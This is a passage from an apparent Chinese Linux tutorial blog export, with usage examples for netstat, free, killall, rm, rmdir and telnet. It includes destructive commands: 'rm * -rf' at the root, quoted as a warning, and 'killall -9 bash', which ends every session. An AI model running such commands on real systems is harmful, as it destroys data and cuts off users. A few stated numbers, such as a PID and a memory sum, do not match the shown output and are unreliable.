-c统计后再进行排序&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -nat |awk '&#123;print $6&#125;'|sort|uniq -c &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415[root@andy ~]# netstat -nat |awk '&#123;print $6&#125;'|sort|uniq -c 14 CLOSE_WAIT 1 established) 578 ESTABLISHED 1 Foreign 43 LISTEN 5 TIME_WAIT[root@andy ~]# netstat -nat |awk '&#123;print $6&#125;'|sort|uniq -c|sort -rn 576 ESTABLISHED 43 LISTEN 14 CLOSE_WAIT 5 TIME_WAIT 1 Foreign 1 established)[root@andy ~]# 实例15：查看连接某服务端口最多的的IP地址&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -nat | grep "192.168.120.20:16067" |awk '&#123;print $5&#125;'|awk -F: '&#123;print $4&#125;'|sort|uniq -c|sort -nr|head -20 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122[root@andy ~]# netstat -nat | grep "192.168.120.20:16067" |awk '&#123;print $5&#125;'|awk -F: '&#123;print $4&#125;'|sort|uniq -c|sort -nr|head -20 8 10.2.1.68 7 192.168.119.13 6 192.168.119.201 6 192.168.119.20 6 192.168.119.10 4 10.2.1.199 3 10.2.1.207 2 192.168.120.20 2 192.168.120.15 2 192.168.119.197 2 192.168.119.11 2 10.2.1.206 2 10.2.1.203 2 10.2.1.189 2 10.2.1.173 1 192.168.120.18 1 192.168.119.19 1 10.2.2.227 1 10.2.2.138 1 10.2.1.208[root@andy ~]# 实例16：找出程序运行的端口&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -ap | grep ssh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789[root@andy ~]# netstat -ap | grep sshtcp 0 0 *:ssh *:* LISTEN 2570/sshd tcp 0 0 ::ffff:192.168.120.206:ssh ::ffff:10.2.1.205:54508 ESTABLISHED 13883/14 tcp 0 0 ::ffff:192.168.120.206:ssh ::ffff:10.2.0.68:62886 ESTABLISHED 20900/6 tcp 0 0 ::ffff:192.168.120.206:ssh ::ffff:10.2.2.131:52730 ESTABLISHED 20285/sshd: root@no unix 2 [ ACC ] STREAM LISTENING 194494461 20900/6 /tmp/ssh-cXIJj20900/agent.20900unix 3 [ ] STREAM CONNECTED 194307443 20285/sshd: root@no unix 3 [ ] STREAM CONNECTED 194307441 20285/sshd: root@no [root@andy ~]# 实例17：在 netstat 输出中显示 PID 和进程名称&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -pt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost ~]# netstat -ptActive Internet connections (w/o servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 248 192.168.120.204:ssh 10.2.0.68:62420 ESTABLISHED 15725/0 [root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;netstat -p 可以与其它开关一起使用，就可以添加 “PID/进程名称” 到 netstat 输出中，这样 debugging 的时候可以很方便的发现特定端口运行的程序。 实例18：找出运行在指定端口的进程&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -anpt | grep ':16064' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617[root@andy ~]# netstat -anpt | grep ':16064'tcp 0 0 :::16064 :::* LISTEN 24594/java tcp 0 0 ::ffff:192.168.120.20:16064 ::ffff:192.168.119.201:6462 ESTABLISHED 24594/java tcp 0 0 ::ffff:192.168.120.20:16064 ::ffff:192.168.119.20:26341 ESTABLISHED 24594/java tcp 0 0 ::ffff:192.168.120.20:16064 ::ffff:192.168.119.20:32208 ESTABLISHED 24594/java tcp 0 0 ::ffff:192.168.120.20:16064 ::ffff:192.168.119.20:32207 ESTABLISHED 24594/java tcp 0 0 ::ffff:192.168.120.20:16064 ::ffff:10.2.1.68:51303 ESTABLISHED 24594/java tcp 0 0 ::ffff:192.168.120.20:16064 ::ffff:10.2.1.68:51302 ESTABLISHED 24594/java tcp 0 0 ::ffff:192.168.120.20:16064 ::ffff:10.2.1.68:50020 ESTABLISHED 24594/java tcp 0 0 ::ffff:192.168.120.20:16064 ::ffff:10.2.1.68:50019 ESTABLISHED 24594/java tcp 0 0 ::ffff:192.168.120.20:16064 ::ffff:10.2.1.68:56155 ESTABLISHED 24594/java tcp 0 0 ::ffff:192.168.120.20:16064 ::ffff:10.2.1.68:50681 ESTABLISHED 24594/java tcp 0 0 ::ffff:192.168.120.20:16064 ::ffff:10.2.1.68:50680 ESTABLISHED 24594/java tcp 0 0 ::ffff:192.168.120.20:16064 ::ffff:10.2.1.68:52136 ESTABLISHED 24594/java tcp 0 0 ::ffff:192.168.120.20:16064 ::ffff:10.2.1.68:56989 ESTABLISHED 24594/java tcp 0 0 ::ffff:192.168.120.20:16064 ::ffff:10.2.1.68:56988 ESTABLISHED 24594/java [root@andy ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;运行在端口16064的进程id为24596，再通过ps命令就可以找到具体的应用程序了。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- free]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F47.%20Linux%20%E5%91%BD%E4%BB%A4-%20free%2F</url>
    <content type="text"><![CDATA[Linux 命令- free&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;free命令可以显示Linux系统中空闲的、已用的物理内存及swap内存,及被内核使用的buffer。在Linux系统监控的工具中，free命令是最经常使用的命令之一。 1．命令格式1free [参数] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;free 命令显示系统使用和空闲的内存情况，包括物理内存、交互区内存(swap)和内核缓冲区内存。共享内存将被忽略 3．命令参数 -b 以Byte为单位显示内存使用情况。 -k 以KB为单位显示内存使用情况。 -m 以MB为单位显示内存使用情况。 -g 以GB为单位显示内存使用情况。 -o 不显示缓冲区调节列。 -s&lt;间隔秒数&gt; 持续观察内存使用状况。 -t 显示内存总和列。 -V 显示版本信息。 4．使用实例实例1：显示内存使用情况&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 123freefree -gfree -m &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415[root@SF1150 service]# free total used free shared buffers cachedMem: 32940112 30841684 2098428 0 4545340 11363424-/+ buffers/cache: 14932920 18007192Swap: 32764556 1944984 30819572[root@SF1150 service]# free -g total used free shared buffers cachedMem: 31 29 2 0 4 10-/+ buffers/cache: 14 17Swap: 31 1 29[root@SF1150 service]# free -m total used free shared buffers cachedMem: 32168 30119 2048 0 4438 11097-/+ buffers/cache: 14583 17584Swap: 31996 1899 30097 说明下面是对这些数值的解释： total:总计物理内存的大小。 used:已使用多大。 free:可用有多少。 Shared:多个进程共享的内存总额。 Buffers/cached:磁盘缓存的大小。 第三行(-/+ buffers/cached): used:已使用多大。 free:可用有多少。 第四行是交换分区SWAP的，也就是我们通常所说的虚拟内存。 区别：第二行(mem)的used/free与第三行(-/+ buffers/cache) used/free的区别。 这两个的区别在于使用的角度来看，第一行是从OS的角度来看，因为对于OS，buffers/cached 都是属于被使用，所以他的可用内存是2098428KB,已用内存是30841684KB,其中包括，内核（OS）使用+Application(X, oracle,etc)使用的+buffers+cached. 第三行所指的是从应用程序角度来看，对于应用程序来说，buffers/cached 是等于可用的，因为buffer/cached是为了提高文件读取的性能，当应用程序需在用到内存的时候，buffer/cached会很快地被回收。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以从应用程序的角度来说，可用内存=系统free memory+buffers+cached。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如本机情况的可用内存为： 18007156=2098428KB+4545340KB+11363424KB 接下来解释什么时候内存会被交换，以及按什么方交换。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当可用内存少于额定值的时候，就会开会进行交换.如何看额定值： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cat /proc/meminfo &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122232425262728[root@SF1150 service]# cat /proc/meminfoMemTotal: 32940112 kBMemFree: 2096700 kBBuffers: 4545340 kBCached: 11364056 kBSwapCached: 1896080 kBActive: 22739776 kBInactive: 7427836 kBHighTotal: 0 kBHighFree: 0 kBLowTotal: 32940112 kBLowFree: 2096700 kBSwapTotal: 32764556 kBSwapFree: 30819572 kBDirty: 164 kBWriteback: 0 kBAnonPages: 14153592 kBMapped: 20748 kBSlab: 590232 kBPageTables: 34200 kBNFS_Unstable: 0 kBBounce: 0 kBCommitLimit: 49234612 kBCommitted_AS: 23247544 kBVmallocTotal: 34359738367 kBVmallocUsed: 278840 kBVmallocChunk: 34359459371 kBHugePages_Total: 0HugePages_Free: 0HugePages_Rsvd: 0Hugepagesize: 2048 kB &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;交换将通过三个途径来减少系统中使用的物理页面的个数： 减少缓冲与页面cache的大小， 将系统V类型的内存页面交换出去， 换出或者丢弃页面。(Application 占用的内存页，也就是物理内存不足）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;事实上，少量地使用swap是不是影响到系统性能的。 那buffers和cached都是缓存，两者有什么区别呢？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为了提高磁盘存取效率, Linux做了一些精心的设计, 除了对dentry进行缓存(用于VFS,加速文件路径名到inode的转换), 还采取了两种主要Cache方式：Buffer Cache和Page Cache。前者针对磁盘块的读写，后者针对文件inode的读写。这些Cache有效缩短了 I/O系统调用(比如read,write,getdents)的时间。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;磁盘的操作有逻辑级（文件系统）和物理级（磁盘块），这两种Cache就是分别缓存逻辑和物理级数据的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Page cache实际上是针对文件系统的，是文件的缓存，在文件层面上的数据会缓存到page cache。文件的逻辑层需要映射到实际的物理磁盘，这种映射关系由文件系统来完成。当page cache的数据需要刷新时，page cache中的数据交给buffer cache，因为Buffer Cache就是缓存磁盘块的。但是这种处理在2.6版本的内核之后就变的很简单了，没有真正意义上的cache操作。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Buffer cache是针对磁盘块的缓存，也就是在没有文件系统的情况下，直接对磁盘进行操作的数据会缓存到buffer cache中，例如，文件系统的元数据都会缓存到buffer cache中。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;简单说来，page cache用来缓存文件数据，buffer cache用来缓存磁盘数据。在有文件系统的情况下，对文件操作，那么数据会缓存到page cache，如果直接采用dd等工具对磁盘进行读写，那么数据会缓存到buffer cache。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以我们看linux,只要不用swap的交换空间,就不用担心自己的内存太少.如果常常swap用很多,可能你就要考虑加物理内存了.这也是linux看内存是否够用的标准. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果是应用服务器的话，一般只看第二行，+buffers/cache,即对应用程序来说free的内存太少了，也是该考虑优化程序或加内存了。 实例2：以总和的形式显示内存的使用信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1free -t &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@SF1150 service]# free -t total used free shared buffers cachedMem: 32940112 30845024 2095088 0 4545340 11364324-/+ buffers/cache: 14935360 18004752Swap: 32764556 1944984 30819572Total: 65704668 32790008 32914660[root@SF1150 service]# 实例3：周期性的查询内存使用信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1free -s 10 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@SF1150 service]# free -s 10 total used free shared buffers cachedMem: 32940112 30844528 2095584 0 4545340 11364380-/+ buffers/cache: 14934808 18005304Swap: 32764556 1944984 30819572 total used free shared buffers cachedMem: 32940112 30843932 2096180 0 4545340 11364388-/+ buffers/cache: 14934204 18005908Swap: 32764556 1944984 30819572 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每10s 执行一次命令]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- killall]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F45.%20Linux%20%E5%91%BD%E4%BB%A4-%20killall%2F</url>
    <content type="text"><![CDATA[Linux 命令- killall&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux系统中的killall命令用于杀死指定名字的进程（kill processes by name）。我们可以使用kill命令杀死指定进程PID的进程，如果要找到我们需要杀死的进程，我们还需要在之前使用ps等命令再配合grep来查找进程，而killall把这两个过程合二为一，是一个很好用的命令。 1．命令格式1killall [参数] [进程名] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用来结束同名的的所有进程 3．命令参数 -Z 只杀死拥有scontext 的进程 -e 要求匹配进程名称 -I 忽略小写 -g 杀死进程组而不是进程 -i 交互模式，杀死进程前先询问用户 -l 列出所有的已知信号名称 -q 不输出警告信息 -s 发送指定的信号 -v 报告信号是否成功发送 -w 等待进程死亡 –help 显示帮助信息 –version 显示版本显示 4．使用实例实例1：杀死所有同名进程&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1killall vi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@localhost ~]# ps -ef|grep viroot 17581 17398 0 17:51 pts/0 00:00:00 vi test.txtroot 17611 17582 0 17:51 pts/1 00:00:00 grep vi[root@localhost ~]# ps -ef|grep viroot 17581 17398 0 17:51 pts/0 00:00:00 vi test.txtroot 17640 17612 0 17:51 pts/2 00:00:00 vi test.logroot 17642 17582 0 17:51 pts/1 00:00:00 grep vi[root@localhost ~]# killall vi[root@localhost ~]# ps -ef|grep viroot 17645 17582 0 17:52 pts/1 00:00:00 grep vi 实例2：向进程发送指定信号&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;后台运行程序： 1vi &amp; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;杀死 vi进程： 1killall -TERM vi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者 1killall -KILL vi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920[root@localhost ~]# vi &amp; [1] 17646[root@localhost ~]# killall -TERM vi[1]+ Stopped vi[root@localhost ~]# vi &amp; [2] 17648[root@localhost ~]# ps -ef|grep viroot 17646 17582 0 17:54 pts/1 00:00:00 viroot 17648 17582 0 17:54 pts/1 00:00:00 viroot 17650 17582 0 17:55 pts/1 00:00:00 grep vi[2]+ Stopped vi[root@localhost ~]# killall -TERM vi[root@localhost ~]# ps -ef|grep viroot 17646 17582 0 17:54 pts/1 00:00:00 viroot 17648 17582 0 17:54 pts/1 00:00:00 viroot 17653 17582 0 17:55 pts/1 00:00:00 grep vi[root@localhost ~]# killall -KILL vi[1]- 已杀死 vi[2]+ 已杀死 vi[root@localhost ~]# ps -ef|grep viroot 17656 17582 0 17:56 pts/1 00:00:00 grep vi[root@localhost ~]# 实例3：把所有的登录后的shell给杀掉&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1killall -9 bash &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@localhost ~]# w 18:01:03 up 41 days, 18:53, 3 users, load average: 0.00, 0.00, 0.00USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATroot pts/0 10.2.0.68 14:58 9:52 0.10s 0.10s -bashroot pts/1 10.2.0.68 17:51 0.00s 0.02s 0.00s wroot pts/2 10.2.0.68 17:51 9:24 0.01s 0.01s -bash[root@localhost ~]# killall -9 bash[root@localhost ~]# w 18:01:48 up 41 days, 18:54, 1 user, load average: 0.07, 0.02, 0.00USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATroot pts/0 10.2.0.68 18:01 0.00s 0.01s 0.00s w[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;运行命令：killall -9 bash 后，所有bash都会被卡掉了，所以当前所有连接丢失了。需要重新连接并登录。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- rm]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F6.%20Linux%20%E5%91%BD%E4%BB%A4-%20rm%2F</url>
    <content type="text"><![CDATA[Linux 命令- rm&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linux中删除文件和目录的命令： rm命令。rm是常用的命令，该命令的功能为删除一个目录中的一个或多个文件或目录，它也可以将某个目录及其下的所有文件及子目录均删除。对于链接文件，只是删除了链接，原有文件均保持不变。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rm是一个危险的命令，使用的时候要特别当心，尤其对于新手，否则整个系统就会毁在这个命令（比如在/（根目录）下执行rm * -rf）。所以，我们在执行rm之前最好先确认一下在哪个目录，到底要删除什么东西，操作时保持高度清醒的头脑。 1．命令格式：1rm [选项] [文件] 2．命令功能：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;删除一个目录中的一个或多个文件或目录，如果没有使用- r选项，则rm不会删除目录。如果使用 rm 来删除文件，通常仍可以将该文件恢复原状。 3．命令参数： -f, –force 忽略不存在的文件，从不给出提示。 -i, –interactive 进行交互式删除 -r, -R, –recursive 指示rm将参数中列出的全部目录和子目录均递归地删除。 -v, –verbose 详细显示进行的步骤 –help 显示此帮助信息并退出 –version 输出版本信息并退出 4．命令实例：实例1：删除文件file，系统会先询问是否删除。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1rm [文件名] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567[root@localhost test1]# ll总计 4-rw-r--r-- 1 root root 56 10-26 14:31 log.logroot@localhost test1]# rm log.log rm：是否删除 一般文件 “log.log”? yroot@localhost test1]# ll总计 0[root@localhost test1]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输入rm log.log命令后，系统会询问是否删除，输入y后就会删除文件，不想删除则数据n。 实例2：强行删除file，系统不再提示。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1rm -f log1.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567[root@localhost test1]# ll总计 4-rw-r--r-- 1 root root 23 10-26 14:40 log1.log[root@localhost test1]# rm -f log1.log [root@localhost test1]# ll总计 0[root@localhost test1]# 实例3：删除任何.log文件；删除前逐一询问确认&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1rm -i *.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678910[root@localhost test1]# ll总计 8-rw-r--r-- 1 root root 11 10-26 14:45 log1.log-rw-r--r-- 1 root root 24 10-26 14:45 log2.log[root@localhost test1]# rm -i *.logrm：是否删除 一般文件 “log1.log”? yrm：是否删除 一般文件 “log2.log”? y[root@localhost test1]# ll总计 0[root@localhost test1]# 实例4：将 test1子目录及子目录中所有档案删除&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1rm -r test1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678910111213141516171819[root@localhost test]# ll总计 24drwxr-xr-x 7 root root 4096 10-25 18:07 scfdrwxr-xr-x 2 root root 4096 10-26 14:51 test1drwxr-xr-x 3 root root 4096 10-25 17:44 test2drwxrwxrwx 2 root root 4096 10-25 17:46 test3drwxr-xr-x 2 root root 4096 10-25 17:56 test4drwxr-xr-x 3 root root 4096 10-25 17:56 test5[root@localhost test]# rm -r test1rm：是否进入目录 “test1”? yrm：是否删除 一般文件 “test1/log3.log”? yrm：是否删除 目录 “test1”? y[root@localhost test]# ll总计 20drwxr-xr-x 7 root root 4096 10-25 18:07 scfdrwxr-xr-x 3 root root 4096 10-25 17:44 test2drwxrwxrwx 2 root root 4096 10-25 17:46 test3drwxr-xr-x 2 root root 4096 10-25 17:56 test4drwxr-xr-x 3 root root 4096 10-25 17:56 test5[root@localhost test]# 实例5：rm -rf test2命令会将 test2 子目录及子目录中所有档案删除,并且不用一一确认&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1rm -rf test2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678[root@localhost test]# rm -rf test2[root@localhost test]# ll总计 16drwxr-xr-x 7 root root 4096 10-25 18:07 scfdrwxrwxrwx 2 root root 4096 10-25 17:46 test3drwxr-xr-x 2 root root 4096 10-25 17:56 test4drwxr-xr-x 3 root root 4096 10-25 17:56 test5[root@localhost test]# 实例6：删除以 -f 开头的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1rm -- -f &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678910111213[root@localhost test]# touch -- -f[root@localhost test]# ls -- -f-f[root@localhost test]# rm -- -frm：是否删除 一般空文件 “-f”? y[root@localhost test]# ls -- -fls: -f: 没有那个文件或目录[root@localhost test]#也可以使用下面的操作步骤:[root@localhost test]# touch ./-f[root@localhost test]# ls ./-f./-f[root@localhost test]# rm ./-frm：是否删除 一般空文件 “./-f”? y[root@localhost test]# 实例7：自定义回收站功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1myrm()&#123; D=/tmp/$(date +%Y%m%d%H%M%S); mkdir -p $D; mv "$@" $D &amp;&amp; echo "moved to $D ok"; &#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678910111213141516171819202122[root@localhost test]# myrm()&#123; D=/tmp/$(date +%Y%m%d%H%M%S); mkdir -p $D; mv "$@" $D &amp;&amp; echo "moved to $D ok"; &#125;[root@localhost test]# alias rm='myrm'[root@localhost test]# touch 1.log 2.log 3.log[root@localhost test]# ll总计 16-rw-r--r-- 1 root root 0 10-26 15:08 1.log-rw-r--r-- 1 root root 0 10-26 15:08 2.log-rw-r--r-- 1 root root 0 10-26 15:08 3.logdrwxr-xr-x 7 root root 4096 10-25 18:07 scfdrwxrwxrwx 2 root root 4096 10-25 17:46 test3drwxr-xr-x 2 root root 4096 10-25 17:56 test4drwxr-xr-x 3 root root 4096 10-25 17:56 test5[root@localhost test]# rm [123].logmoved to /tmp/20121026150901 ok[root@localhost test]# ll总计 16drwxr-xr-x 7 root root 4096 10-25 18:07 scfdrwxrwxrwx 2 root root 4096 10-25 17:46 test3drwxr-xr-x 2 root root 4096 10-25 17:56 test4drwxr-xr-x 3 root root 4096 10-25 17:56 test5[root@localhost test]# ls /tmp/20121026150901/1.log 2.log 3.log[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面的操作过程模拟了回收站的效果，即删除文件的时候只是把文件放到一个临时目录中，这样在需要的时候还可以恢复过来。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;参考资料：我使用过的Linux命令之rm - 删除文件或目录]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- rmdir]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F5.%20Linux%20%E5%91%BD%E4%BB%A4-rmdir%2F</url>
    <content type="text"><![CDATA[Linux 命令- rmdir&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rmdir是常用的命令，该命令的功能是删除空目录，一个目录被删除之前必须是空的。（注意，rm - r dir命令可代替rmdir，但是有很大危险性。）删除某目录时也必须具有对父目录的写权限。 1．命令格式：1rmdir [选项] [目录] 2．命令功能：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该命令从一个目录中删除一个或多个子目录项，删除某目录时也必须具有对父目录的写权限。 3．命令参数： p 递归删除目录dirname，当子目录删除后其父目录为空时，也一同被删除。如果整个路径被删除或者由于某种原因保留部分路径，则系统在标准输出上显示相应的信息。 -v, –verbose 显示指令执行过程 4．命令实例：实例1：rmdir 不能删除非空目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1rmdir doc &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678910111213141516171819202122232425262728293031323334[root@localhost scf]# tree.|-- bin|-- doc| |-- info| `-- product|-- lib|-- logs| |-- info| `-- product`-- service `-- deploy |-- info `-- product 12 directories, 0 files[root@localhost scf]# rmdir docrmdir: doc: 目录非空[root@localhost scf]# rmdir doc/info[root@localhost scf]# rmdir doc/product[root@localhost scf]# tree.|-- bin|-- doc|-- lib|-- logs| |-- info| `-- product`-- service `-- deploy |-- info `-- product 10 directories, 0 files &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rmdir 目录名 命令不能直接删除非空目录 实例2：rmdir -p 当子目录被删除后使它也成为空目录的话，则顺便一并删除&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1rmdir -p logs &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678910111213141516171819202122232425262728293031323334353637383940[root@localhost scf]# tree.|-- bin|-- doc|-- lib|-- logs| `-- product`-- service `-- deploy |-- info `-- product 10 directories, 0 files[root@localhost scf]# rmdir -p logsrmdir: logs: 目录非空[root@localhost scf]# tree.|-- bin|-- doc|-- lib|-- logs| `-- product`-- service `-- deploy |-- info `-- product 9 directories, 0 files[root@localhost scf]# rmdir -p logs/product[root@localhost scf]# tree.|-- bin|-- doc|-- lib`-- service`-- deploy |-- info `-- product 7 directories, 0 files]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- telnet]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F60.%20Linux%20%E5%91%BD%E4%BB%A4-%20telnet%2F</url>
    <content type="text"><![CDATA[Linux 命令- telnet&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;telnet命令通常用来远程登录。telnet程序是基于TELNET协议的远程登录客户端程序。Telnet协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的 能力。在终端使用者的电脑上使用telnet程序，用它连接到服务器。终端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制服务器。要开始一个 telnet会话，必须输入用户名和密码来登录服务器。Telnet是常用的远程控制Web服务器的方法。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但是，telnet因为采用明文传送报文，安全性不好，很多Linux服务器都不开放telnet服务，而改用更安全的ssh方式了。但仍然有很多别的系统可能采用了telnet方式来提供远程登录，因此弄清楚telnet客户端的使用方式仍是很有必要的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;telnet命令还可做别的用途，比如确定远程服务的状态，比如确定远程服务器的某个端口是否能访问。 1．命令格式1telnet [参数] [主机] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行telnet指令开启终端机阶段作业，并登入远端主机。 3．命令参数 -8 允许使用8位字符资料，包括输入与输出。 -a 尝试自动登入远端系统。 -b&lt;主机别名&gt; 使用别名指定远端主机名称。 -c 不读取用户专属目录里的.telnetrc文件。 -d 启动排错模式。 -e&lt;脱离字符&gt; 设置脱离字符。 -E 滤除脱离字符。 -f 此参数的效果和指定”-F”参数相同。 -F 使用Kerberos V5认证时，加上此参数可把本地主机的认证数据上传到远端主机。 -k&lt;域名&gt; 使用Kerberos认证时，加上此参数让远端主机采用指定的领域名，而非该主机的域名。 -K 不自动登入远端主机。 -l&lt;用户名称&gt; 指定要登入远端主机的用户名称。 -L 允许输出8位字符资料。 -n&lt;记录文件&gt; 指定文件记录相关信息。 -r 使用类似rlogin指令的用户界面。 -S&lt;服务类型&gt; 设置telnet连线所需的IP TOS信息。 -x 假设主机有支持数据加密的功能，就使用它。 -X&lt;认证形态&gt; 关闭指定的认证形态。 4．使用实例实例1：远程服务器无法访问&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1telnet 192.168.120.206 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost ~]# telnet 192.168.120.209Trying 192.168.120.209...telnet: connect to address 192.168.120.209: No route to hosttelnet: Unable to connect to remote host: No route to host[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;处理这种情况方法： 确认ip地址是否正确？ 确认ip地址对应的主机是否已经开机？ 如果主机已经启动，确认路由设置是否设置正确？（使用route命令查看） 如果主机已经启动，确认主机上是否开启了telnet服务？（使用netstat命令查看，TCP的23端口是否有LISTEN状态的行） 如果主机已经启动telnet服务，确认防火墙是否放开了23端口的访问？（使用iptables-save查看） 实例2：域名无法解析&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1telnet www.baidu.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123[root@localhost ~]# telnet 